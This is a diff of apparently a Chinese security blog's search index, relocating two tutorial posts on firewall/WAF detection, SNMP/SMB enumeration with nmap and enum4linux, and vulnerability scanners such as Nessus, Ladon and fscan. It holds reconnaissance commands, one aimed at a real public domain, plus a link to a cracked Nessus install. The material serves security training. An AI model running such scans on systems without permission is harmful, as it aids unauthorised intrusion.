@@ -1377,85 +1377,6 @@
       </tags>
   </entry>
   <entry>
-    <title>防护扫描与服务枚举</title>
-    <url>/post/fcfd17ed.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>防火墙(Firewall):防火墙指的是一个由软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的边界上构造的保护屏障。防火墙是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。</p>
-<p>通过发送SYN和ACK数据包并分析回包可以大概判断端口是否被防火墙过滤，对应关系如下表：</p>
-<p><img src="https://img.136.la/20210811/2623fe2699d84c3c95a67f0d743cb7b5.jpg" alt="技术分享图片"></p>
-<h3 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h3><p>使用nmap识别是否开启防火墙过滤：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sA &lt;ip&gt; -p &lt;端口号&gt;	#端口号可随机</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/05/AyuLdYB7qV65Sbp.png" alt="5584d547d07031a8387f1626102702de.png"></p>
-<p>从状态可以看出，前者开启了防护墙过滤，而后者没有。</p>
-<h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
-<h3 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-waf-detect.nse www.baidu.com</span><br></pre></td></tr></table></figure>
-<h3 id="Wafw00f"><a href="#Wafw00f" class="headerlink" title="Wafw00f"></a>Wafw00f</h3><p>Kali Linux内置工具</p>
-<p>使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f baidu.com</span><br></pre></td></tr></table></figure>
-<h2 id="负载均衡检测"><a href="#负载均衡检测" class="headerlink" title="负载均衡检测"></a>负载均衡检测</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>负载均衡建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。</p>
-<ul>
-<li>广域网负载均衡</li>
-</ul>
-<p>他的原理就是DNS，简单的方法就是使用DNS轮询来进行负载均衡。当你访问一个域名时，同一个域名会被解析成多个A记录解析到多个ip地址上。</p>
-<ul>
-<li>服务器负载均衡</li>
-</ul>
-<p>基于web的服务，经常使用的是nginx、apache这种应用层的负载均衡。</p>
-<p>当然也可以使用一些负载均衡设备去实现。</p>
-<blockquote>
-<p>目的：在扫描探测的阶段，我们也有必要发现一下目标域名被解析到多少个服务器，这些歌服务器有可能因为管理员的配置不善，不同的服务器之间他们的安全防护是不一样的，配置也不一样，有的ip可能就会存在问题。这时候我们去识别目标系统使用的是什么负载均衡，以及这个负载均衡，他是不是本身存在有漏洞。</p>
-</blockquote>
-<h3 id="ldb"><a href="#ldb" class="headerlink" title="ldb"></a>ldb</h3><p>使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldb www.baidu.com</span><br></pre></td></tr></table></figure>
-<h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p><strong>SNMP：简单网络管理协议</strong></p>
-<ul>
-<li>基于SNMP，进行网络设备监控，如：交换机、防火墙、服务器，CPU等其系统内部信息。基本都可以监控到</li>
-<li>community：登录证书，容易被管理员遗忘修改其特征字符 #可用字典破解community（public/private/manager）</li>
-<li>信息的金矿，经常被错误配置</li>
-</ul>
-<p><strong>MIB Tree：</strong></p>
-<ul>
-<li>SNMP Management Information</li>
-<li>树型的网络设备管理功能数据库</li>
-</ul>
-<h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>安装服务</strong></p>
-<p><img src="https://i.loli.net/2021/10/05/85U3arIzFtbwdBm.png" alt="ae48d149296cc788257c26e64ca572ea.png"></p>
-<p><strong>开启服务</strong></p>
-<p><img src="https://i.loli.net/2021/10/05/WRrzJepmAH9lnhB.png" alt="d485a496a5508d5aa5948c360aa87d07.png"></p>
-<p>默认接受的社区为monitor，且接受来自任何主机的snmp数据包</p>
-<h3 id="snmp-check"><a href="#snmp-check" class="headerlink" title="snmp-check"></a>snmp-check</h3><p>Kali Linux内置工具</p>
-<p>使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmp-check 192.168.123.188 -c monitor</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/05/uDUAGfRKconYF9V.png" alt="dbb7f10caccb74233aa89189bded2968.png"></p>
-<p>相比于onesixtyone能扫描出更多信息，相比于snmpwalk可读性更好。</p>
-<h2 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p><strong>SMB协议：</strong></p>
-<ul>
-<li>Server Message Block协议</li>
-<li>微软历史上出现问题最多的协议</li>
-<li>实现复杂，默认在Windows上是开放的，也是最常用的协议，用于实现文件的共享</li>
-</ul>
-<h3 id="nmap脚本扫描-1"><a href="#nmap脚本扫描-1" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>可以使用nmap扫描默认开放的端口139,445，但是不能准确判断操作系统的类型，一般情况下是Windows系统</p>
-<p>1、使用nmap自带的脚本进行操作系统的判断</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.123.155 -p139,445 --script=smb-os-discovery.nse</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/10/05/AIN1zeR7KFWQykE.png" alt="0f24a04ebf8aef1ffa37c6ad8a661aa9.png"></p>
-<p>2、扫描Windows系统中的SMB协议是否有漏洞；可以使用smb-vuln-*.nse来指定所有的脚本文件，进行全扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=safe=1 192.168.123.155 </span><br></pre></td></tr></table></figure>
-<p><img src="/post/data:;base64,
-        <svg width=" 1700" height="1536" xmlns="http://www.w3.org/2000/svg">  " /></p>
-<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>enum4linux是Kali Linux自带的一款信息收集工具。它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000XP/2003，在Windows 7/10系统，部分功能受限。</p>
-<p><strong>选项：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-U</span><br><span class="line">    获取用户列表</span><br><span class="line"></span><br><span class="line">-M</span><br><span class="line">    get machine list*</span><br><span class="line"></span><br><span class="line">-S</span><br><span class="line">    获取共享列表</span><br><span class="line"></span><br><span class="line">-P</span><br><span class="line">    获取密码策略信息</span><br><span class="line"></span><br><span class="line">-G</span><br><span class="line">    获取组和成员列表</span><br><span class="line"></span><br><span class="line">-d</span><br><span class="line">    详细说明，适用于-U和-S</span><br><span class="line"></span><br><span class="line">-u user</span><br><span class="line">    指定要使用的用户名（默认为“”）</span><br><span class="line"></span><br><span class="line">-p pass</span><br><span class="line">    指定要使用的密码（默认为“”）</span><br></pre></td></tr></table></figure>
-<p><strong>附加选项：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a</span><br><span class="line">    执行所有简单的枚举（-U -S -G -P -r -o -n -i）。如果您未提供其他任何选项，则启用此选项。</span><br><span class="line"></span><br><span class="line">-h</span><br><span class="line">    显示帮助信息并退出</span><br><span class="line"></span><br><span class="line">-r</span><br><span class="line">    通过RID循环枚举用户</span><br><span class="line"></span><br><span class="line">-R range</span><br><span class="line">    要枚举的范围（默认值：500-550、1000-1050，暗含-r）</span><br><span class="line"></span><br><span class="line">-K n</span><br><span class="line">    继续搜索RID，直到n个连续的RID与用户名不对应为止。 Impies RID范围以999999结尾。对于DC很有用。</span><br><span class="line"></span><br><span class="line">-l</span><br><span class="line">    通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DC）</span><br><span class="line"></span><br><span class="line">-s file</span><br><span class="line">    暴力破解推测股票名称</span><br><span class="line"></span><br><span class="line">-k user</span><br><span class="line">    远程系统上存在的用户（默认：管理员，来宾，krbtgt，域管理员，root，bin，none）。用于通过“ lookupsidknown_username”获取sid。使用逗号尝试多个用户：“ -k admin， user1，user2”</span><br><span class="line"></span><br><span class="line">-o</span><br><span class="line">    获取操作系统信息</span><br><span class="line"></span><br><span class="line">-i</span><br><span class="line">    获取打印机信息</span><br><span class="line"></span><br><span class="line">-w wrkg</span><br><span class="line">    手动指定工作组（通常自动找到）</span><br><span class="line"></span><br><span class="line">-n</span><br><span class="line">    做一个nmblookup（类似于nbtstat）</span><br><span class="line"></span><br><span class="line">-v</span><br><span class="line">    详细。 显示正在运行的完整命令（net，rpcclient等）</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>扫描与枚举</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>端口扫描</title>
     <url>/post/cbdcd826.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="网络端口"><a href="#网络端口" class="headerlink" title="网络端口"></a>网络端口</h2><h3 id="何为端口"><a href="#何为端口" class="headerlink" title="何为端口"></a>何为端口</h3><p>在网络技术中，端口(Port)大致有两种意思：一是物理意义上的端口，比如，ADSL Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等；二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。</p>
@@ -1949,6 +1870,120 @@
       </tags>
   </entry>
   <entry>
+    <title>防护扫描与服务枚举</title>
+    <url>/post/fcfd17ed.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>防火墙(Firewall):防火墙指的是一个由软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的边界上构造的保护屏障。防火墙是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。</p>
+<p>通过发送SYN和ACK数据包并分析回包可以大概判断端口是否被防火墙过滤，对应关系如下表：</p>
+<p><img src="https://img.136.la/20210811/2623fe2699d84c3c95a67f0d743cb7b5.jpg" alt="技术分享图片"></p>
+<h3 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h3><p>使用nmap识别是否开启防火墙过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sA &lt;ip&gt; -p &lt;端口号&gt;	#端口号可随机</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/05/AyuLdYB7qV65Sbp.png" alt="5584d547d07031a8387f1626102702de.png"></p>
+<p>从状态可以看出，前者开启了防护墙过滤，而后者没有。</p>
+<h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
+<h3 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-waf-detect.nse www.baidu.com</span><br></pre></td></tr></table></figure>
+<h3 id="Wafw00f"><a href="#Wafw00f" class="headerlink" title="Wafw00f"></a>Wafw00f</h3><p>Kali Linux内置工具</p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f baidu.com</span><br></pre></td></tr></table></figure>
+<h2 id="负载均衡检测"><a href="#负载均衡检测" class="headerlink" title="负载均衡检测"></a>负载均衡检测</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>负载均衡建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。</p>
+<ul>
+<li>广域网负载均衡</li>
+</ul>
+<p>他的原理就是DNS，简单的方法就是使用DNS轮询来进行负载均衡。当你访问一个域名时，同一个域名会被解析成多个A记录解析到多个ip地址上。</p>
+<ul>
+<li>服务器负载均衡</li>
+</ul>
+<p>基于web的服务，经常使用的是nginx、apache这种应用层的负载均衡。</p>
+<p>当然也可以使用一些负载均衡设备去实现。</p>
+<blockquote>
+<p>目的：在扫描探测的阶段，我们也有必要发现一下目标域名被解析到多少个服务器，这些歌服务器有可能因为管理员的配置不善，不同的服务器之间他们的安全防护是不一样的，配置也不一样，有的ip可能就会存在问题。这时候我们去识别目标系统使用的是什么负载均衡，以及这个负载均衡，他是不是本身存在有漏洞。</p>
+</blockquote>
+<h3 id="ldb"><a href="#ldb" class="headerlink" title="ldb"></a>ldb</h3><p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldb www.baidu.com</span><br></pre></td></tr></table></figure>
+<h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p><strong>SNMP：简单网络管理协议</strong></p>
+<ul>
+<li>基于SNMP，进行网络设备监控，如：交换机、防火墙、服务器，CPU等其系统内部信息。基本都可以监控到</li>
+<li>community：登录证书，容易被管理员遗忘修改其特征字符 #可用字典破解community（public/private/manager）</li>
+<li>信息的金矿，经常被错误配置</li>
+</ul>
+<p><strong>MIB Tree：</strong></p>
+<ul>
+<li>SNMP Management Information</li>
+<li>树型的网络设备管理功能数据库</li>
+</ul>
+<h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>安装服务</strong></p>
+<p><img src="https://i.loli.net/2021/10/05/85U3arIzFtbwdBm.png" alt="ae48d149296cc788257c26e64ca572ea.png"></p>
+<p><strong>开启服务</strong></p>
+<p><img src="https://i.loli.net/2021/10/05/WRrzJepmAH9lnhB.png" alt="d485a496a5508d5aa5948c360aa87d07.png"></p>
+<p>默认接受的社区为monitor，且接受来自任何主机的snmp数据包</p>
+<h3 id="snmp-check"><a href="#snmp-check" class="headerlink" title="snmp-check"></a>snmp-check</h3><p>Kali Linux内置工具</p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmp-check 192.168.123.188 -c monitor</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/05/uDUAGfRKconYF9V.png" alt="dbb7f10caccb74233aa89189bded2968.png"></p>
+<p>相比于onesixtyone能扫描出更多信息，相比于snmpwalk可读性更好。</p>
+<h2 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p><strong>SMB协议：</strong></p>
+<ul>
+<li>Server Message Block协议</li>
+<li>微软历史上出现问题最多的协议</li>
+<li>实现复杂，默认在Windows上是开放的，也是最常用的协议，用于实现文件的共享</li>
+</ul>
+<h3 id="nmap脚本扫描-1"><a href="#nmap脚本扫描-1" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>可以使用nmap扫描默认开放的端口139,445，但是不能准确判断操作系统的类型，一般情况下是Windows系统</p>
+<p>1、使用nmap自带的脚本进行操作系统的判断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.123.155 -p139,445 --script=smb-os-discovery.nse</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/05/AIN1zeR7KFWQykE.png" alt="0f24a04ebf8aef1ffa37c6ad8a661aa9.png"></p>
+<p>2、扫描Windows系统中的SMB协议是否有漏洞；可以使用smb-vuln-*.nse来指定所有的脚本文件，进行全扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=safe=1 192.168.123.155 </span><br></pre></td></tr></table></figure>
+<p><img src="/post/data:;base64,
+        <svg width=" 1700" height="1536" xmlns="http://www.w3.org/2000/svg">  " /></p>
+<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>enum4linux是Kali Linux自带的一款信息收集工具。它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000XP/2003，在Windows 7/10系统，部分功能受限。</p>
+<p><strong>选项：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-U</span><br><span class="line">    获取用户列表</span><br><span class="line"></span><br><span class="line">-M</span><br><span class="line">    get machine list*</span><br><span class="line"></span><br><span class="line">-S</span><br><span class="line">    获取共享列表</span><br><span class="line"></span><br><span class="line">-P</span><br><span class="line">    获取密码策略信息</span><br><span class="line"></span><br><span class="line">-G</span><br><span class="line">    获取组和成员列表</span><br><span class="line"></span><br><span class="line">-d</span><br><span class="line">    详细说明，适用于-U和-S</span><br><span class="line"></span><br><span class="line">-u user</span><br><span class="line">    指定要使用的用户名（默认为“”）</span><br><span class="line"></span><br><span class="line">-p pass</span><br><span class="line">    指定要使用的密码（默认为“”）</span><br></pre></td></tr></table></figure>
+<p><strong>附加选项：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a</span><br><span class="line">    执行所有简单的枚举（-U -S -G -P -r -o -n -i）。如果您未提供其他任何选项，则启用此选项。</span><br><span class="line"></span><br><span class="line">-h</span><br><span class="line">    显示帮助信息并退出</span><br><span class="line"></span><br><span class="line">-r</span><br><span class="line">    通过RID循环枚举用户</span><br><span class="line"></span><br><span class="line">-R range</span><br><span class="line">    要枚举的范围（默认值：500-550、1000-1050，暗含-r）</span><br><span class="line"></span><br><span class="line">-K n</span><br><span class="line">    继续搜索RID，直到n个连续的RID与用户名不对应为止。 Impies RID范围以999999结尾。对于DC很有用。</span><br><span class="line"></span><br><span class="line">-l</span><br><span class="line">    通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DC）</span><br><span class="line"></span><br><span class="line">-s file</span><br><span class="line">    暴力破解推测股票名称</span><br><span class="line"></span><br><span class="line">-k user</span><br><span class="line">    远程系统上存在的用户（默认：管理员，来宾，krbtgt，域管理员，root，bin，none）。用于通过“ lookupsidknown_username”获取sid。使用逗号尝试多个用户：“ -k admin， user1，user2”</span><br><span class="line"></span><br><span class="line">-o</span><br><span class="line">    获取操作系统信息</span><br><span class="line"></span><br><span class="line">-i</span><br><span class="line">    获取打印机信息</span><br><span class="line"></span><br><span class="line">-w wrkg</span><br><span class="line">    手动指定工作组（通常自动找到）</span><br><span class="line"></span><br><span class="line">-n</span><br><span class="line">    做一个nmblookup（类似于nbtstat）</span><br><span class="line"></span><br><span class="line">-v</span><br><span class="line">    详细。 显示正在运行的完整命令（net，rpcclient等）</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>扫描与枚举</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>系统与网络漏洞扫描器</title>
+    <url>/post/57b56c16.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>Nessus是全球使用人数最多的系统漏洞扫描与分析软件，这是一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程序，功能十分强大。</p>
+<p><strong>docker安装</strong></p>
+<p>Nessus有教育版和专业版。Nessus教育版最大只支持扫描16个主机,但利用docker无限使用,当然虚拟机快照也可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -itd -p 8834:8834 registry.cn-hangzhou.aliyuncs.com/steinven/nessus:v0.1</span><br></pre></td></tr></table></figure>
+<p>注意该命令中的—rm参数，每次容器停止后会自动删除，如不想删除，去掉该参数即可</p>
+<p>访问<code>https://ip:8834</code>（注意是<code>https</code>），账号：<code>admin</code>密码：<code>admin</code></p>
+<p><strong>Windows安装</strong></p>
+<p>有关Windows上安装Nessus的教程可以参考一下文章：</p>
+<p>Windows操作系统上安装破解Nessus：<a href="https://www.cnblogs.com/x1234567890/p/14872001.html">https://www.cnblogs.com/x1234567890/p/14872001.html</a></p>
+<h2 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h2><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置94个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
+<p>项目地址：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
+<p>使用文档：<a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></p>
+<h2 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h2><p>OpenVAS 是一个全功能的漏洞扫描器。它的功能包括非认证测试、认证测试、各种高水平和低水平的互联网和工业协议、大规模扫描的性能调整和一个强大的内部编程语言来实现任何类型的漏洞测试。</p>
+<p>使用Kali Linux 进行安装、扫描教程：</p>
+<p><a href="https://www.kali.org/blog/openvas-vulnerability-scanning/">https://www.kali.org/blog/openvas-vulnerability-scanning/</a></p>
+<h2 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h2><p>Rapid7 Nexpose是一款面向大型网络组织的安全风险智能解决方案。</p>
+<p>Nexpose主动支持整个漏洞管理生命周期，包括发现，检测，验证，风险分类，影响分析，报告和缓解。</p>
+<p>官网地址：<a href="https://www.rapid7.com/products/nexpose/">https://www.rapid7.com/products/nexpose/</a></p>
+<p>下载与安装教程：<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></p>
+<p>使用教程：<a href="https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html">https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html</a></p>
+<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscan是一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</p>
+<p>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
+<p>项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>扫描与枚举</category>
+      </categories>
+      <tags>
+        <tag>漏洞扫描</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web漏洞扫描器</title>
     <url>/post/c6e2d2e0.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h2><p>BurpSuite是用于攻击 web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
@@ -2315,41 +2350,6 @@
 <p>相关安装流程可参考：<a href="https://www.jianshu.com/p/171ab006183a">https://www.jianshu.com/p/171ab006183a</a></p>
 <h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><p>Skipfish是一款轻量级的主动的Web应用程序安全侦察工具。它通过执行递归爬取和基于字典的探测来为目标站点准备交互式站点地图。最终的地图然后用来自许多活动（但希望是不中断的）安全检查的输出来注释。该工具生成的最终报告旨在作为专业Web应用程序安全评估的基础。</p>
 <p>Kali Linux内置工具。</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>扫描与枚举</category>
-      </categories>
-      <tags>
-        <tag>漏洞扫描</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>系统与网络漏洞扫描器</title>
-    <url>/post/57b56c16.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>Nessus是全球使用人数最多的系统漏洞扫描与分析软件，这是一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程序，功能十分强大。</p>
-<p><strong>docker安装</strong></p>
-<p>Nessus有教育版和专业版。Nessus教育版最大只支持扫描16个主机,但利用docker无限使用,当然虚拟机快照也可以。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -itd -p 8834:8834 registry.cn-hangzhou.aliyuncs.com/steinven/nessus:v0.1</span><br></pre></td></tr></table></figure>
-<p>注意该命令中的—rm参数，每次容器停止后会自动删除，如不想删除，去掉该参数即可</p>
-<p>访问<code>https://ip:8834</code>（注意是<code>https</code>），账号：<code>admin</code>密码：<code>admin</code></p>
-<p><strong>Windows安装</strong></p>
-<p>有关Windows上安装Nessus的教程可以参考一下文章：</p>
-<p>Windows操作系统上安装破解Nessus：<a href="https://www.cnblogs.com/x1234567890/p/14872001.html">https://www.cnblogs.com/x1234567890/p/14872001.html</a></p>
-<h2 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h2><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置94个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
-<p>项目地址：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
-<p>使用文档：<a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></p>
